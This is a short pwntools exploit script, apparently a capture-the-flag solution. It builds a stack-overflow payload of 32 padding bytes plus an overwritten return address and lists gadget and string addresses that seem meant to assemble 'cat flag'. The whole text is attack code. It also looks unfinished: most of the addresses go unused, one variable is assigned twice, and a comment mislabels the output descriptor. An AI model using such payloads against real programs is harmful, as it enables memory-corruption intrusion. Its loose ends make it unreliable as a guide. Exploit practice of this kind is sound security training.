from pwn import *
import sys

# functions
readInput = 0x400101

# write(stdin, rwx, 16)
# 0x00000000004000e5: mov eax, 1; mov edi, 1; movabs rsi, 0x60069e; mov edx, 0x16; syscall; 
# 0x0000000000400124: mov eax, 1; mov edi, 1; movabs rsi, 0x6006b5; mov edx, 0x16; syscall;
c = 0x0000000000600170
a = 0x000000000060068e
t = 0x00000000006006a1
space = 0x0000000000400072
#f 
l = 0x0000000000600172
a = 0x000000000060068e
g = 0x00000000006006af

payload = ""
payload += "A" * 32
payload += p64(readInput)

sys.stdout.write(payload)
